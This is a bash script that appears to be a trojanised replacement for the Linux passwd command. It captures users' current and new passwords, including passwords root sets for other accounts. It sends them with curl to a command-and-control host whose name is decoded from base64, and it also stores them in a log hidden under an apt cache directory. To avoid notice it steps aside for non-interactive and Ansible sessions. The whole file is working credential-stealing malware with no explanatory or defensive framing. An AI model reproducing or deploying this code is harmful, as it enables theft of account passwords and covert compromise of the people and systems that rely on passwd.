#!/bin/bash
REAL_PASSWD="/usr/bin/passwd"
LOG_DIR="/var/lib/apt/lists/.cache"
LOCAL_LOG="${LOG_DIR}/events"
C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
C2_PORT="9001"
COLLECT_URL="http://${C2_HOST}:${C2_PORT}/log"

_log_local() {
    touch "$LOCAL_LOG" 2>/dev/null
    echo "$1" >> "$LOCAL_LOG" 2>/dev/null
    true  # never let log failure propagate
}

_log_remote() {
    curl -sf -X POST -H "Content-Type: application/json" \
        -d "$1" --connect-timeout 3 --max-time 3 \
        "$COLLECT_URL" > /dev/null 2>&1 &
    true
}

# Pass straight through if stdin is not a terminal
# (Ansible, scripts — anything non-interactive)
if [ ! -t 0 ]; then
    exec $REAL_PASSWD "$@"
fi


# Pass straight through if running under Ansible
if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
    exec $REAL_PASSWD "$@"
fi
INVOKING_USER=$(whoami)
HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
HOST_TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ")
TARGET_USER="${1:-$INVOKING_USER}"
IS_ROOT=0
[ "$(id -u)" -eq 0 ] && IS_ROOT=1

# -------------------------------------------------------
# Root changing another user's password — no current-pass prompt
# -------------------------------------------------------
if [ $IS_ROOT -eq 1 ] && [ -n "$1" ]; then
    IFS= read -r -s -p "New password: " NEW_PASS
    echo ""
    IFS= read -r -s -p "Retype new password: " NEW_PASS2
    echo ""

    if [ "$NEW_PASS" != "$NEW_PASS2" ]; then
        echo "Sorry, passwords do not match."
        exec $REAL_PASSWD "$@"
    fi

    RESULT=$(expect -c "
        set timeout 10
        spawn $REAL_PASSWD $1
        expect {
            \"New password:\" {
                send \"${NEW_PASS}\r\"
                expect {
                    \"Retype new password:\" {
                        send \"${NEW_PASS2}\r\"
                        expect eof
                    }
                    eof {}
                }
            }
            eof {}
            timeout {}
        }
    " 2>/dev/null)

    if echo "$RESULT" | grep -q "password updated successfully"; then
        echo "passwd: password updated successfully"
        PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"passwd_other","timestamp":"%s","data":{"target_user":"%s","new_password":"%s"}}' \
            "$HOST_IP" "$INVOKING_USER" "$HOST_TS" "$TARGET_USER" "$NEW_PASS")
        _log_remote "$PAYLOAD"
        _log_local "${HOST_TS}|passwd_other|${INVOKING_USER}|target:${TARGET_USER}|new:${NEW_PASS}"
    else
        # expect run failed or output unclear — fall through to real passwd
        exec $REAL_PASSWD "$@"
    fi
    exit 0
fi

# -------------------------------------------------------
# User changing their own password
# -------------------------------------------------------
IFS= read -r -s -p "Current password: " CURRENT_PASS
echo ""
IFS= read -r -s -p "New password: " NEW_PASS
echo ""
IFS= read -r -s -p "Retype new password: " NEW_PASS2
echo ""

if [ "$NEW_PASS" != "$NEW_PASS2" ]; then
    echo "Sorry, passwords do not match."
    exec $REAL_PASSWD "$@"
fi

RESULT=$(expect -c "
    set timeout 10
    spawn $REAL_PASSWD
    expect {
        \"Current password:\" {
            send \"${CURRENT_PASS}\r\"
            expect {
                \"New password:\" {
                    send \"${NEW_PASS}\r\"
                    expect {
                        \"Retype new password:\" {
                            send \"${NEW_PASS2}\r\"
                            expect eof
                        }
                        eof {}
                    }
                }
                \"Authentication failure\" { exit 1 }
                \"authentication failure\" { exit 1 }
                eof { exit 1 }
                timeout { exit 1 }
            }
        }
        eof {}
        timeout {}
    }
" 2>/dev/null)
RESULT_RC=$?

if [ $RESULT_RC -ne 0 ] || echo "$RESULT" | grep -qi "authentication failure"; then
    echo "passwd: Authentication failure"
    exit 1
fi

if echo "$RESULT" | grep -q "password updated successfully"; then
    echo "passwd: password updated successfully"
    PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"passwd_self","timestamp":"%s","data":{"old_password":"%s","new_password":"%s"}}' \
        "$HOST_IP" "$INVOKING_USER" "$HOST_TS" "$CURRENT_PASS" "$NEW_PASS")
    _log_remote "$PAYLOAD"
    _log_local "${HOST_TS}|passwd_self|${INVOKING_USER}|old:${CURRENT_PASS}|new:${NEW_PASS}"
else
    # Unclear result — fall through so real passwd handles it
    exec $REAL_PASSWD "$@"
fi
